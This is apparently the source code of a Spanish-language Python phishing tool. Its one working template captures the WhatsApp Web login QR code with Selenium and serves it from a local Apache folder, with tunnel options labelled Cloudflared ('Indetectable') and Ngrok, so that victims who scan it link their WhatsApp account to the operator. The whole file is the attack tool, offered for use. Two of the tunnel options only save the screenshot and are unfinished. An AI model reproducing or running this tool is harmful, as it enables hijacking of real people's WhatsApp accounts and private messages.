from selenium import webdriver
import time
import os


def generar_banner(contenido):
    lineas = contenido.split("\n")
    max_longitud = max(len(linea) for linea in lineas)

    banner = []
    banner.append("*" * (max_longitud + 4))
    for linea in lineas:
        espacios = max_longitud - len(linea)
        banner.append(f"* {linea}{' ' * espacios} *")
    banner.append("*" * (max_longitud + 4))

    return "\n".join(banner)

ruta_archivo = "banner.txt"

with open(ruta_archivo, "r") as archivo:
    contenido = archivo.read()
    banner = generar_banner(contenido)
    print(banner)

def mostrar_menu():
    print("")
    print("Selecciona una Plantilla :")
    print("")
    print("1. Phising de Bot para Whatsapp.")
    print("")
    print("2. Proximamente.")
    print("")
    print("3. Proximamente.")
    print("")

def opcion1():
    print("")
    os.system('clear')
    print(banner)
    def mostrar_menu2():
        print("")
        print("Selecciona el Tunel :")
        print("")
        print("1. Localhost. (Red Local)")
        print("")
        print("2. Cloudflared. (Indetectable)")
        print("")
        print("3. Ngrok. (Detectable)")
        print("")

    def opcion1():
        print("")
        os.system('clear')
        print(banner)

        os.system('xterm -T "RIP-Network Terminal" -geometry 226x52 -e "cd host"')
        os.system('xterm -T "RIP-Network Terminal" -geometry 226x52 -e "service apache2 start"')

        url = f"https://web.whatsapp.com"

        browser = webdriver.Chrome()
        qr_page_url = url
        browser.get(qr_page_url)

        time.sleep(5)
        qr_element = browser.find_element_by_xpath('/html/body/div[1]/div/div/div[3]/div[1]/div/div/div[2]/div/canvas')
        time.sleep(2)
        qr_image = qr_element.screenshot_as_png

        with open("codigo_qr.png", "wb") as f:
            f.write(qr_image)

        time.sleep(10)
        os.system('mv codigo_qr.png /host/')

        os.system('clear')
        print(banner)
        print("Phising Iniciado con Exito!")
        print("")
        pause=input("Pulse Enter para cerrar la Herramienta.")



    def opcion2():
        print("")
        os.system('clear')
        print(banner)
        url = f"https://web.whatsapp.com"

        browser = webdriver.Chrome()
        qr_page_url = url
        browser.get(qr_page_url)

        time.sleep(5)
        qr_element = browser.find_element_by_xpath('/html/body/div[1]/div/div/div[3]/div[1]/div/div/div[2]/div/canvas')
        time.sleep(2)
        qr_image = qr_element.screenshot_as_png

        with open("codigo_qr.png", "wb") as f:
            f.write(qr_image)

    def opcion3():
        print("")
        os.system('clear')
        print(banner)
        url = f"https://web.whatsapp.com"

        browser = webdriver.Chrome()
        qr_page_url = url
        browser.get(qr_page_url)

        time.sleep(5)
        qr_element = browser.find_element_by_xpath('/html/body/div[1]/div/div/div[3]/div[1]/div/div/div[2]/div/canvas')
        time.sleep(2)
        qr_image = qr_element.screenshot_as_png

        with open("codigo_qr.png", "wb") as f:
            f.write(qr_image)

    while True:
      mostrar_menu2()

      opcion = input("Ingresa el número de la opción: ")

      if opcion == "1":
        opcion1()
      elif opcion == "2":
        opcion2()
      elif opcion == "3":
        opcion3()
      else:
        print("Opción inválida. Por favor, selecciona una opción válida.")

def opcion2():
    print("Proximamente.")

def opcion3():
    print("Proximamente.")

while True:
    mostrar_menu()

    opcion = input("Ingresa el número de la opción: ")

    if opcion == "1":
        opcion1()
    elif opcion == "2":
        opcion2()
    elif opcion == "3":
        opcion3()
    else:
        print("Opción inválida. Por favor, selecciona una opción válida.")